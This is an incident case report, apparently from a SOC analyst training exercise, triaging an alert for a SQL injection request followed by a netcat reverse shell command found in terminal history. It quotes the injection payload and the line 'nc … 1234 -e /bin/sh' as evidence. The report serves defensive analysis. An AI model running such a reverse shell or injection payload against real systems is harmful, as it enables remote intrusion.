# Case Report — SOC142: Multiple HTTP 500 Response (SQLi + Reverse Shell Attempt)

**Date:** 2021-04-18  
**Category:** Web attack (SQL injection) + post-exploitation  
**Verdict:** True Positive (Likely compromise)

---

## 1) Alert Summary
- **Time:** Apr 18, 2021, 01:00 PM
- **Rule:** SOC142 — Multiple HTTP 500 Response
- **Action:** Allowed
- **Source IP:** `101.32.223.119`
- **Target:** `172.16.20.6` (SQLServer)
- **User:** www-data
- **URL (defanged):**  
  `hxxps://172.16.20.6/userNumber=1 AND (SELECT * FROM Users) = 1`

## 2) Evidence (Log Management)
- Proxy log captured a request containing clear SQL injection syntax.
- Server returned **HTTP 500** (server error). Only one relevant proxy entry was available in provided logs.

## 3) Endpoint / Terminal Evidence
- Terminal history contained a netcat reverse shell command:  
  `nc 101.32.223.119 1234 -e /bin/sh`
- This indicates attempted outbound remote shell / C2-style communication.

## 4) Findings
- **SQLi attempt:** YES
- **Post-exploitation indicator:** YES (reverse shell command observed)
- **Impact:** Likely compromise / active post-exploitation
- **Quarantine:** N/A (not applicable)

## 5) Response / Recommendations
- Isolate the affected server (SQLServer).
- Block outbound traffic to `101.32.223.119` (especially port **1234**).
- Review web/app logs and scope for additional exploitation traces.

## 6) Artifacts
- **Attacker IP:** `101.32.223.119` (reverse shell target; port 1234 referenced)
- **URL:** `hxxps://172.16.20.6/userNumber=1 AND (SELECT * FROM Users) = 1`

## 7) Final Comment
SOC142 detected web requests causing HTTP 500 errors on `SQLServer`, containing SQL injection syntax from `101.32.223.119`. Endpoint evidence showed a netcat reverse shell command targeting `101.32.223.119:1234`, indicating likely post-exploitation activity. **Verdict: TP; isolate and block outbound communication; scope the incident further.**
